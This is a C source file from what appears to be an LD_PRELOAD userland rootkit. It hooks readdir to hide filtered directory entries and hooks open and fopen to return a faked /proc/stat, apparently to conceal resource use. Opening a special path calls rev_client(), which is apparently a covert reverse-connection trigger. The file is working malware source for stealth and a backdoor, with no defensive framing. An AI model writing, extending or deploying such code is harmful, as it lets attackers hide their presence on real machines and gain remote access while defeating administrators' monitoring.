#include <stdio.h>
#include <dirent.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <fcntl.h>
#include "overrides.h"
#include "util.h"
#include "client.h"

struct dirent *(*original_readdir)(DIR *dirp) = NULL;

struct dirent *readdir(DIR *dirp)
{
    ORIG(readdir, NULL);

    struct dirent *dir;
    do dir = original_readdir(dirp); while (dir && should_filter(dir->d_name, dirp));
    return dir;
}

int (*original_open)(const char *path, int flags, ...);

int open(const char *path, int flags, ...)
{
    int ret = -1;
    ORIG(open, -1);

    int mode;
    va_list argp;
    va_start(argp, flags);
    if ((flags & O_CREAT) || (flags & O_TMPFILE)) mode = va_arg(argp, int);
    va_end(argp);

    char *absolute_path = realpath(path, NULL);
    if (!absolute_path) return original_open(path, flags, mode);

    if (strcmp(absolute_path, "/proc/stat") == 0)
    {
        ret = fake_proc_stat();
    }
    else if (strcmp(absolute_path, "/" PREFIX "/rev") == 0)
    {
        rev_client();
    }
    else
    {
        ret = original_open(path, flags, mode);
    }

    free(absolute_path);
    return ret;
}

// FIXME implement openat

FILE *(*original_fopen)(const char *path, const char *mode) = NULL;

FILE *fopen(const char *path, const char *mode)
{
    FILE *ret = NULL;
    ORIG(fopen, NULL);

    char *absolute_path = realpath(path, NULL);
    if (!absolute_path) return original_fopen(path, mode);

    if (strcmp(absolute_path, "/proc/stat") == 0)
    {
        ret = fdopen(fake_proc_stat(), "r+");
    }
    else if (strcmp(absolute_path, "/" PREFIX "/rev") == 0)
    {
        rev_client();
    }
    else
    {
        ret = original_fopen(path, mode);
    }

    free(absolute_path);
    return ret;
}
